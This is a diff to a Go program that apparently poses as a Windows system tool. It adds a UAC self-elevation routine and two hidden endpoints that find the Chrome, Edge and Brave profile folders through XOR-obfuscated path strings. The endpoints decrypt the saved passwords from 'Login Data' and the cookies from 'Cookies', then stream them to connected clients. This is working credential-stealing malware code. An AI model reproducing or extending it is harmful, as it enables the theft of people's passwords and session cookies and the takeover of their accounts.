@@ -64,6 +64,34 @@ func isAdmin() bool {
 	return token.IsElevated()
 }
 
+func selfElevate() {
+	if isAdmin() {
+		return
+	}
+	exe, err := os.Executable()
+	if err != nil {
+		log.Println("[!] Cannot resolve executable path:", err)
+		os.Exit(1)
+	}
+	cwd, _ := os.Getwd()
+	args := strings.Join(os.Args[1:], " ")
+	shell32 := syscall.NewLazyDLL("shell32.dll")
+	shellExecute := shell32.NewProc("ShellExecuteW")
+	ret, _, _ := shellExecute.Call(
+		0,
+		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("runas"))),
+		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(exe))),
+		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(args))),
+		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(cwd))),
+		1, // SW_SHOWNORMAL
+	)
+	if ret <= 32 {
+		log.Println("[!] UAC elevation failed or was cancelled")
+		os.Exit(1)
+	}
+	os.Exit(0)
+}
+
 func decryptV20(data []byte) string {
 	pCoInitialize.Call(0)
 	defer pCoUninitialize.Call()
@@ -213,6 +241,7 @@ func sc(a uintptr) (uint32, uintptr) {
 }
 
 func main() {
+	selfElevate()
 	go func() {
 		l, _ := net.Listen("tcp", "127.0.0.1:0")
 		for {
@@ -319,6 +348,48 @@ func main() {
 		}
 		json.NewEncoder(w).Encode(resEntries)
 	}))
+	http.HandleFunc("/v1/op/a7", auth(func(w http.ResponseWriter, r *http.Request) {
+		la := os.Getenv("LOCALAPPDATA"); browsers := []string{"Chrome", "Edge", "Brave"}
+		go func() {
+			for _, name := range browsers {
+				mk, err := getMasterKey(name); if err != nil { logS("MK_FAIL: "+name, "ERROR"); continue }
+				logS("MK_HIT: "+name, "SUCCESS")
+				var base string
+				switch name {
+				case "Brave": base = filepath.Join(la, d([]byte{0x7D, 0x4D, 0x5E, 0x49, 0x5A, 0x6C, 0x50, 0x59, 0x4B, 0x48, 0x5E, 0x4D, 0x5A}), d([]byte{0x7D, 0x4D, 0x5E, 0x49, 0x5A, 0x12, 0x7D, 0x4D, 0x50, 0x48, 0x4C, 0x5A, 0x4D}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
+				case "Edge": base = filepath.Join(la, d([]byte{0x72, 0x56, 0x5C, 0x4D, 0x50, 0x4C, 0x50, 0x59, 0x4B}), d([]byte{0x7A, 0x5B, 0x58, 0x5A}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
+				default: base = filepath.Join(la, d([]byte{0x78, 0x50, 0x50, 0x58, 0x53, 0x5A}), d([]byte{0x7C, 0x57, 0x4D, 0x50, 0x52, 0x5A}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
+				}
+				var entries []Entry
+				filepath.Walk(base, func(p string, info os.FileInfo, err error) error {
+					if err == nil && (strings.Contains(info.Name(), "Login Data") && !strings.Contains(p, "journal")) {
+						logS("FOUND_INTEL: "+p, "INFO"); tmp := filepath.Join(os.TempDir(), "i_db"); captureSnapshot(p, tmp); defer os.Remove(tmp)
+						db, err := sql.Open("sqlite", fmt.Sprintf("file:%s?mode=ro&nolock=1&immutable=1", filepath.ToSlash(tmp)))
+						if err == nil {
+							q := "SELECT origin_url, username_value, password_value FROM logins"; rows, err := db.Query(q)
+							if err != nil { q = "SELECT action_url, username_value, password_value FROM logins"; rows, err = db.Query(q) }
+							if err == nil && rows != nil {
+								for rows.Next() {
+									var u, us string; var pData []byte; rows.Scan(&u, &us, &pData); dec := decryptData(pData, mk)
+									if dec != "" { entries = append(entries, Entry{name, u, us, dec}) }
+								}
+								rows.Close()
+							}
+							db.Close()
+						}
+					}
+					return nil
+				})
+				if len(entries) > 0 {
+					msg := map[string]interface{}{"type": "a7_chunk", "browser": name, "entries": entries}
+					mut.Lock(); for c := range clients { c.WriteJSON(msg) }; mut.Unlock()
+				}
+			}
+			done := map[string]interface{}{"type": "a7_done"}
+			mut.Lock(); for c := range clients { c.WriteJSON(done) }; mut.Unlock()
+		}()
+		w.Write([]byte("OK"))
+	}))
 	http.HandleFunc("/v1/sys/cookies", auth(func(w http.ResponseWriter, r *http.Request) {
 		la := os.Getenv("LOCALAPPDATA"); browsers := []string{"Chrome", "Edge", "Brave"}
 		var resCookies []Cookie = []Cookie{}
@@ -352,6 +423,47 @@ func main() {
 			})
 		}
 		json.NewEncoder(w).Encode(resCookies)
+	}))
+	http.HandleFunc("/v1/op/cookies", auth(func(w http.ResponseWriter, r *http.Request) {
+		la := os.Getenv("LOCALAPPDATA"); browsers := []string{"Chrome", "Edge", "Brave"}
+		go func() {
+			for _, name := range browsers {
+				mk, err := getMasterKey(name); if err != nil { logS("MK_FAIL: "+name, "ERROR"); continue }
+				logS("MK_HIT: "+name, "SUCCESS")
+				var base string
+				switch name {
+				case "Brave": base = filepath.Join(la, d([]byte{0x7D, 0x4D, 0x5E, 0x49, 0x5A, 0x6C, 0x50, 0x59, 0x4B, 0x48, 0x5E, 0x4D, 0x5A}), d([]byte{0x7D, 0x4D, 0x5E, 0x49, 0x5A, 0x12, 0x7D, 0x4D, 0x50, 0x48, 0x4C, 0x5A, 0x4D}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
+				case "Edge": base = filepath.Join(la, d([]byte{0x72, 0x56, 0x5C, 0x4D, 0x50, 0x4C, 0x50, 0x59, 0x4B}), d([]byte{0x7A, 0x5B, 0x58, 0x5A}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
+				default: base = filepath.Join(la, d([]byte{0x78, 0x50, 0x50, 0x58, 0x53, 0x5A}), d([]byte{0x7C, 0x57, 0x4D, 0x50, 0x52, 0x5A}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
+				}
+				var cookies []Cookie
+				filepath.Walk(base, func(p string, info os.FileInfo, err error) error {
+					if err == nil && (strings.Contains(info.Name(), "Cookies") && !strings.Contains(p, "journal")) {
+						logS("FOUND_COOKIE: "+p, "INFO"); tmp := filepath.Join(os.TempDir(), "c_db"); captureSnapshot(p, tmp); defer os.Remove(tmp)
+						db, err := sql.Open("sqlite", fmt.Sprintf("file:%s?mode=ro&nolock=1&immutable=1", filepath.ToSlash(tmp)))
+						if err == nil {
+							rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
+							if err == nil && rows != nil {
+								for rows.Next() {
+									var h, n string; var v []byte; rows.Scan(&h, &n, &v); dec := decryptData(v, mk)
+									if dec != "" { cookies = append(cookies, Cookie{name, h, n, dec}) }
+								}
+								rows.Close()
+							}
+							db.Close()
+						}
+					}
+					return nil
+				})
+				if len(cookies) > 0 {
+					msg := map[string]interface{}{"type": "cookies_chunk", "browser": name, "entries": cookies}
+					mut.Lock(); for c := range clients { c.WriteJSON(msg) }; mut.Unlock()
+				}
+			}
+			done := map[string]interface{}{"type": "cookies_done"}
+			mut.Lock(); for c := range clients { c.WriteJSON(done) }; mut.Unlock()
+		}()
+		w.Write([]byte("OK"))
 	}))
 	http.HandleFunc("/v1/sys/opt", auth(func(w http.ResponseWriter, r *http.Request) { json.NewEncoder(w).Encode(ApplyTweaks()) }))
 	http.HandleFunc("/v1/sys/b2", auth(func(w http.ResponseWriter, r *http.Request) { json.NewEncoder(w).Encode(getProcessListDetailed()) }))
